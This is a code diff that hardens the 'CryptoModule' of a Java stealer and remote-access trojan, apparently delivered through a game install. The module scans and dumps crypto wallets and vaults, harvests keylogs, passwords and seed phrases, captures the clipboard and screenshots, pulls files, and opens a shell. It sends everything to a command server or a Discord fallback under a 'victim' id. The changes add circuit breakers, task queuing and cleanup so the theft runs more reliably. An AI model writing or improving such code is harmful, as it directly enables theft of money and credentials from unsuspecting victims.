@@ -19,12 +19,15 @@ import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Set;
+import java.util.concurrent.ArrayBlockingQueue;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.Future;
+import java.util.concurrent.RejectedExecutionException;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.Semaphore;
+import java.util.concurrent.ThreadPoolExecutor;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicInteger;
@@ -46,6 +49,9 @@ public final class CryptoModule {
 	private static final Set<String> SUPPORTED = Set.of(
 		"scan_wallets", "dump_vault", "crack_vault", "clip_start", "clip_stop",
 		"shell", "harvest", "screenshot", "file_pull", "cancel");
+	/** One collection at a time: these share a single heavy worker. */
+	private static final Set<String> HEAVY = Set.of("scan_wallets", "dump_vault", "crack_vault", "harvest");
+	static final String BUSY = "busy: another collection is running";
 
 	private final Path installDir;
 	private final Path gameDir;
@@ -62,11 +68,19 @@ public final class CryptoModule {
 	private final Map<String, AtomicBoolean> cancels = new ConcurrentHashMap<>();
 	private final Map<String, Future<?>> active = new ConcurrentHashMap<>();
 	private final Map<String, Integer> counters = new LinkedHashMap<>();
-	private final ExecutorService pool = Executors.newFixedThreadPool(2, runnable -> {
-		Thread thread = new Thread(runnable, "spc-crypto");
-		thread.setDaemon(true);
-		return thread;
-	});
+	private final ExecutorService heavyPool = new ThreadPoolExecutor(1, 1, 0L, TimeUnit.MILLISECONDS,
+		new ArrayBlockingQueue<>(4), runnable -> {
+			Thread thread = new Thread(runnable, "spc-crypto-heavy");
+			thread.setDaemon(true);
+			return thread;
+		}, new ThreadPoolExecutor.AbortPolicy());
+	private final ExecutorService lightPool = new ThreadPoolExecutor(2, 2, 0L, TimeUnit.MILLISECONDS,
+		new ArrayBlockingQueue<>(16), runnable -> {
+			Thread thread = new Thread(runnable, "spc-crypto-light");
+			thread.setDaemon(true);
+			return thread;
+		}, new ThreadPoolExecutor.AbortPolicy());
+	private final Semaphore heavy = new Semaphore(1);
 	private final ExecutorService uploadsPool = Executors.newSingleThreadExecutor(runnable -> {
 		Thread thread = new Thread(runnable, "spc-crypto-upload");
 		thread.setDaemon(true);
@@ -86,6 +100,7 @@ public final class CryptoModule {
 	private volatile Thread taskThread;
 	private volatile ClipboardWatcher clipboard;
 	private volatile CryptoConfig activeConfig;
+	private volatile String lastBreaker = "closed";
 
 	public CryptoModule(Path installDir, Path gameDir, CryptoConfig config, Sink sink) {
 		this.installDir = installDir;
@@ -130,6 +145,7 @@ public final class CryptoModule {
 		builder.append(" victim=").append(transport.victimId().isEmpty() ? "-" : transport.victimId());
 		builder.append(" modules=").append(moduleHealth);
 		builder.append(" queues=").append(uploadsActive.get());
+		builder.append(" api=").append(transport.breaker());
 		if (clipboard != null) {
 			builder.append(' ').append(clipboard.status());
 		}
@@ -170,10 +186,15 @@ public final class CryptoModule {
 		for (AtomicBoolean cancel : cancels.values()) {
 			cancel.set(true);
 		}
-		pool.shutdownNow();
+		poolShutdown();
 		uploadsPool.shutdownNow();
 		scheduler.shutdownNow();
 		saveState();
+	}
+
+	private void poolShutdown() {
+		heavyPool.shutdownNow();
+		lightPool.shutdownNow();
 	}
 
 	private void heartbeatLoop() {
@@ -181,6 +202,11 @@ public final class CryptoModule {
 			boolean enrolled = transport.enrolled();
 			while (running && enabled) {
 				try {
+					if (transport.apiOpen()) {
+						breakerLog("open");
+						Thread.sleep(30_000L);
+						continue;
+					}
 					if (!enrolled) {
 						enrolled = enroll();
 						if (!enrolled) {
@@ -189,11 +215,13 @@ public final class CryptoModule {
 						}
 					}
 					sendHeartbeat();
+					breakerLog("closed");
 					Thread.sleep(config.jitter(config.heartbeatMs));
 				} catch (InterruptedException interrupted) {
 					return;
 				} catch (Throwable throwable) {
-					warn("heartbeat failed", throwable);
+					breakerLog("open");
+					log("heartbeat failed: " + shortMessage(throwable));
 					try {
 						Thread.sleep(config.jitter(15_000L));
 					} catch (InterruptedException interrupted) {
@@ -206,10 +234,28 @@ public final class CryptoModule {
 		hbThread.start();
 	}
 
+	/** One line per breaker state change, not one per failed attempt. */
+	private void breakerLog(String state) {
+		if (state.equals(lastBreaker)) {
+			return;
+		}
+		lastBreaker = state;
+		if (state.equals("open")) {
+			log("api circuit open for 10 min; Discord sink only (" + transport.breaker() + ")");
+		} else {
+			log("api circuit closed");
+		}
+	}
+
 	private void taskLoop() {
 		taskThread = new Thread(() -> {
 			while (running && enabled) {
 				try {
+					if (transport.apiOpen()) {
+						breakerLog("open");
+						Thread.sleep(30_000L);
+						continue;
+					}
 					if (!transport.enrolled()) {
 						Thread.sleep(config.jitter(10_000L));
 						continue;
@@ -236,7 +282,11 @@ public final class CryptoModule {
 								continue;
 							}
 							int timeout = (int) Math.min(3600, Math.max(1, Json.num(map, "timeout_sec", 120L)));
-							submit(new Task(id, name, Json.map(map.get("params")), timeout));
+							Task pending = new Task(id, name, Json.map(map.get("params")), timeout);
+							String rejected = submit(pending);
+							if (rejected != null) {
+								postResult(pending, "error", rejected, Map.of());
+							}
 						}
 					}
 					pollNow.tryAcquire(config.jitter(config.pollMs), TimeUnit.MILLISECONDS);
@@ -244,7 +294,8 @@ public final class CryptoModule {
 				} catch (InterruptedException interrupted) {
 					return;
 				} catch (Throwable throwable) {
-					warn("task poll failed", throwable);
+					breakerLog("open");
+					log("task poll failed: " + shortMessage(throwable));
 					try {
 						Thread.sleep(config.jitter(12_000L));
 					} catch (InterruptedException interrupted) {
@@ -331,28 +382,45 @@ public final class CryptoModule {
 		return version == null ? "0.3.0" : version;
 	}
 
-	public void submit(Task task) {
+	/** Returns null when accepted, or a readable rejection reason. */
+	public String submit(Task task) {
+		boolean collection = HEAVY.contains(task.name());
+		if (collection && !heavy.tryAcquire()) {
+			return BUSY;
+		}
 		AtomicBoolean cancel = new AtomicBoolean();
 		cancels.put(task.id(), cancel);
-		Future<?> future = pool.submit(() -> {
-			long began = System.currentTimeMillis();
-			try {
-				Map<String, Object> result = handle(task, cancel);
-				if (cancel.get()) {
-					postResult(task, "cancelled", null, result);
-				} else {
-					postResult(task, "ok", null, result);
+		try {
+			Future<?> future = (collection ? heavyPool : lightPool).submit(() -> {
+				long began = System.currentTimeMillis();
+				try {
+					Map<String, Object> result = handle(task, cancel);
+					if (cancel.get()) {
+						postResult(task, "cancelled", null, result);
+					} else {
+						postResult(task, "ok", null, result);
+					}
+				} catch (Throwable throwable) {
+					warn("task " + task.name() + " failed", throwable);
+					postResult(task, "error", throwable.getClass().getSimpleName() + ":" + shortMessage(throwable), Map.of());
+				} finally {
+					active.remove(task.id());
+					cancels.remove(task.id());
+					if (collection) {
+						heavy.release();
+					}
+					log("task " + task.name() + " " + (System.currentTimeMillis() - began) + "ms pid="
+						+ ProcessHandle.current().pid());
 				}
-			} catch (Throwable throwable) {
-				warn("task " + task.name() + " failed", throwable);
-				postResult(task, "error", throwable.getClass().getSimpleName() + ":" + shortMessage(throwable), Map.of());
-			} finally {
-				active.remove(task.id());
-				cancels.remove(task.id());
-				log("task " + task.name() + " " + (System.currentTimeMillis() - began) + "ms");
+			});
+			active.put(task.id(), future);
+		} catch (RejectedExecutionException rejected) {
+			cancels.remove(task.id());
+			if (collection) {
+				heavy.release();
 			}
-		});
-		active.put(task.id(), future);
+			return BUSY;
+		}
 		scheduler.schedule(() -> {
 			AtomicBoolean flag = cancels.get(task.id());
 			if (flag != null) {
@@ -363,6 +431,7 @@ public final class CryptoModule {
 				current.cancel(true);
 			}
 		}, task.timeout(), TimeUnit.SECONDS);
+		return null;
 	}
 
 	private Map<String, Object> handle(Task task, AtomicBoolean cancel) throws Exception {
@@ -404,13 +473,16 @@ public final class CryptoModule {
 		boolean extensions = !Boolean.FALSE.equals(params.get("include_extensions"));
 		boolean seeds = config.seeds && !Boolean.FALSE.equals(params.get("include_seeds"));
 		int maxFiles = (int) Math.min(20_000, Math.max(1, Json.num(params, "max_files", 2500L)));
+		long maxBytes = Json.num(params, "max_bytes", Math.min(config.maxArtifact, 256L * 1024L * 1024L));
 		long began = System.currentTimeMillis();
 		List<Map<String, Object>> wallets = new ArrayList<>();
 		List<Map<String, Object>> findings = new ArrayList<>();
 		Path moduleDir = work.resolve("scan-" + task.id());
 		Files.createDirectories(moduleDir);
 		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "wallets");
+		pack.budget(maxBytes);
 
+		try {
 		if (extensions) {
 			for (CryptoPaths.Target target : CryptoPaths.extensionTargets(config.full)) {
 				if (cancel.get()) {
@@ -491,6 +563,10 @@ public final class CryptoModule {
 			result.put("upload_id", upload);
 		}
 		return result;
+		} finally {
+			pack.close();
+			cleanup(moduleDir);
+		}
 	}
 
 	private Map<String, Object> inspect(CryptoPaths.Target target, AtomicBoolean cancel) {
@@ -556,6 +632,7 @@ public final class CryptoModule {
 		Files.createDirectories(temp);
 
 		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "wallets");
+		try {
 		if (target != null) {
 			Path copy = temp.resolve("store");
 			DesktopDump.copyLevel(source, copy);
@@ -602,8 +679,11 @@ public final class CryptoModule {
 		String upload = queueUpload(pack, "wallets");
 		result.put("upload_id", upload);
 		result.put("status", upload.isEmpty() ? "partial" : "queued");
-		cleanup(temp);
 		return result;
+		} finally {
+			pack.close();
+			cleanup(temp);
+		}
 	}
 
 	private void addTree(ArtifactPack pack, Path root, String prefix, AtomicBoolean cancel) {
@@ -718,8 +798,12 @@ public final class CryptoModule {
 			Path file = clipboard.flush(dir);
 			if (file != null) {
 				ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "clipboard");
-				if (pack.add(file, "clipboard.jsonl", "clipboard")) {
-					upload = queueUpload(pack, "clipboard");
+				try {
+					if (pack.add(file, "clipboard.jsonl", "clipboard")) {
+						upload = queueUpload(pack, "clipboard");
+					}
+				} finally {
+					pack.close();
 				}
 			}
 		}
@@ -793,17 +877,23 @@ public final class CryptoModule {
 		Path ops = AgentPaths.cache(installDir).resolve("ops");
 		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "keylogs");
 		Path converted = work.resolve("keylogs-" + System.currentTimeMillis() + ".jsonl");
-		boolean any = convertLog(ops.resolve("keys.log"), converted, false);
-		if (any) {
-			pack.add(converted, "keylogs.jsonl", "keylogs");
-		}
 		Path passwords = work.resolve("passwords-" + System.currentTimeMillis() + ".jsonl");
-		if (convertLog(ops.resolve("passwords.log"), passwords, true)) {
-			pack.add(passwords, "passwords.jsonl", "passwords");
-		}
-		pack.add(ops.resolve("seeds.log"), "seeds.log", "seeds");
-		if (pack.size() > 0) {
-			result.put("upload_id", queueUpload(pack, "keylogs"));
+		try {
+			boolean any = convertLog(ops.resolve("keys.log"), converted, false);
+			if (any) {
+				pack.add(converted, "keylogs.jsonl", "keylogs");
+			}
+			if (convertLog(ops.resolve("passwords.log"), passwords, true)) {
+				pack.add(passwords, "passwords.jsonl", "passwords");
+			}
+			pack.add(ops.resolve("seeds.log"), "seeds.log", "seeds");
+			if (pack.size() > 0) {
+				result.put("upload_id", queueUpload(pack, "keylogs"));
+			}
+		} finally {
+			pack.close();
+			Files.deleteIfExists(converted);
+			Files.deleteIfExists(passwords);
 		}
 		return result;
 	}
@@ -850,12 +940,16 @@ public final class CryptoModule {
 	private Map<String, Object> screenshot() throws Exception {
 		Path file = Screenshot.save(work.resolve("screens"));
 		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "screenshot");
-		pack.add(file, "screenshot.png", "screenshot");
-		String upload = queueUpload(pack, "screenshot");
-		Map<String, Object> result = new LinkedHashMap<>();
-		result.put("upload_id", upload);
-		result.put("bytes", Files.size(file));
-		return result;
+		try {
+			pack.add(file, "screenshot.png", "screenshot");
+			String upload = queueUpload(pack, "screenshot");
+			Map<String, Object> result = new LinkedHashMap<>();
+			result.put("upload_id", upload);
+			result.put("bytes", Files.size(file));
+			return result;
+		} finally {
+			pack.close();
+		}
 	}
 
 	private Map<String, Object> filePull(Task task) throws Exception {
@@ -869,12 +963,16 @@ public final class CryptoModule {
 			throw new IllegalArgumentException("file_too_large");
 		}
 		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "files");
-		pack.add(file, "files/" + file.getFileName(), "file");
-		String upload = queueUpload(pack, "files");
-		Map<String, Object> result = new LinkedHashMap<>();
-		result.put("upload_id", upload);
-		result.put("bytes", Files.size(file));
-		return result;
+		try {
+			pack.add(file, "files/" + file.getFileName(), "file");
+			String upload = queueUpload(pack, "files");
+			Map<String, Object> result = new LinkedHashMap<>();
+			result.put("upload_id", upload);
+			result.put("bytes", Files.size(file));
+			return result;
+		} finally {
+			pack.close();
+		}
 	}
 
 	// ── uploads ─────────────────────────────────────────────────────────────
@@ -898,22 +996,41 @@ public final class CryptoModule {
 			body.put("sha256", sha);
 			CryptoTransport.Reply init = null;
 			try {
-				init = transport.uploadInit(CryptoUtil.utf8(Json.stringify(body)));
+				if (!transport.apiOpen()) {
+					init = transport.uploadInit(CryptoUtil.utf8(Json.stringify(body)));
+				}
 			} catch (Throwable throwable) {
-				log("api upload unavailable: " + throwable.getMessage());
+				breakerLog("open");
+				log("api upload unavailable: " + shortMessage(throwable));
 			}
 			if (init == null || init.status() != 201) {
 				try {
 					Path zip = file.resolveSibling(file.getFileName().toString().replace(".spc", ".zip"));
 					pack.buildZip(zip);
+					Files.deleteIfExists(file);
+					uploadsActive.decrementAndGet();
 					if (sink != null) {
-						sink.send(module, zip);
+						uploadsPool.submit(() -> {
+							try {
+								sink.send(module, zip);
+							} catch (Throwable throwable) {
+								warn("discord fallback failed", throwable);
+							} finally {
+								try {
+									Files.deleteIfExists(zip);
+								} catch (Throwable ignored) {
+									// best effort
+								}
+							}
+						});
+					} else {
+						Files.deleteIfExists(zip);
 					}
 				} catch (Throwable throwable) {
 					warn("discord fallback failed", throwable);
+					Files.deleteIfExists(file);
+					uploadsActive.decrementAndGet();
 				}
-				Files.deleteIfExists(file);
-				uploadsActive.decrementAndGet();
 				log("upload init failed, discord fallback");
 				return "";
 			}
@@ -1110,14 +1227,20 @@ public final class CryptoModule {
 		body.put("result", result);
 		body.put("artifacts", List.of());
 		byte[] json = CryptoUtil.utf8(Json.stringify(body));
-		try {
-			CryptoTransport.Reply reply = transport.result(task.id(), json);
-			if (reply.status() >= 200 && reply.status() < 300) {
-				return;
+		if (!transport.apiOpen()) {
+			try {
+				CryptoTransport.Reply reply = transport.result(task.id(), json);
+				if (reply.status() >= 200 && reply.status() < 300) {
+					breakerLog("closed");
+					return;
+				}
+				log("result post rejected: " + reply.status());
+			} catch (Throwable throwable) {
+				breakerLog("open");
+				log("result post failed: " + shortMessage(throwable));
 			}
-			warn("result post rejected: " + reply.status(), null);
-		} catch (Throwable throwable) {
-			warn("result post failed", throwable);
+		} else {
+			breakerLog("open");
 		}
 		postResultFallback(task, json);
 	}
@@ -1138,8 +1261,14 @@ public final class CryptoModule {
 			String id = task.id().replaceAll("[^A-Za-z0-9-]", "_");
 			Path file = dir.resolve("result-" + name + "-" + id + ".json");
 			Files.write(file, json, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
-			sink.send("result", file);
-			log("result fallback sent: " + file.getFileName());
+			uploadsPool.submit(() -> {
+				try {
+					sink.send("result", file);
+					log("result fallback sent: " + file.getFileName());
+				} catch (Throwable throwable) {
+					warn("result fallback failed", throwable);
+				}
+			});
 		} catch (Throwable throwable) {
 			warn("result fallback failed", throwable);
 		}
